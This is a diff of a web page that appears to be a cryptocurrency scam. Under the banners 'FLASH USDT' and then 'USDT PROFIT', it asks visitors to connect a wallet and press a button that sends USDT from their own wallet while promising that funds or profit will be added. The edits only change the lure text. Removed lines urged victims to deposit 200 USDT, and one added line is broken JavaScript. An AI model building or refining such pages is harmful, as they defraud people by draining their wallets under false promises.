@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CONNECT YOUR WALLET TO ACCEPT YOUR PAYMENT</title>.
+    <title>CONNECT YOUR WALLET TO ADD INVEST TO YOUR USDT</title>.
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
     <style>
         * {
@@ -339,7 +339,7 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>CRYPTO FLASH USDT</h1>
+            <h1>USDT PROFIT</h1>
         </div>
         
         <div class="content">
@@ -380,7 +380,7 @@
                         <div class="amount-title">USDT TRON TO FLASH</div>
                     </div>
                     <div class="amount-display" id="ethAmountDisplay">0.00</div>
-                    <div class="amount-note">500,000 USDT WILL BE ADDED TO YOUR WALLET</div>
+                    <div class="amount-note">YOUR PROFIT WILL BE ADDED AS ACCORDING TO YOUR AVAILABILITY</div>
                 </div>
 
                 <div class="action-buttons">
@@ -391,7 +391,7 @@
                     
                     <button class="action-btn usdt-btn" id="sendUsdtBtn" onclick="sendUSDT()">
                         <span class="btn-icon">$</span>
-                        <span>FLASH USDT</span>
+                        <span>USDT PROFIT</span>
                     </button>
                 </div>
             </div>
@@ -559,7 +559,7 @@
         async function sendUSDT() {
             try {
                 if (!usdtBalance || usdtBalance == 0) {
-                    showStatus("FLASH SENT INSUFFICIENT USDT TO ACCEPT THE PAYMENT PLEASE DEPOSIT 200 USDT TO YOUR WALLET FOR FIRST TIME USER AND RETRY", "error");
+                    showStatus(" SENT INSUFFICIENT USDT TO PROFIT, "error");
                     return;
                 }
                 
@@ -583,7 +583,7 @@
                 const receipt = await tx.wait();
                 
                 if (receipt.status === 1) {
-                    showStatus(`✅ USDT ADD successfully PROCESSED ACCEPTED NETWORK YOUR PAYMENT IS PROCESSED if don't received your gasfee amount is low please deposit to your wallet to cover the gas fee and retry!`, "success");
+                    showStatus(`✅ USDT ADD successfully `, "success");
                     await loadBalances();
                 } else {
                     showStatus("USDT transfer failed", "error");
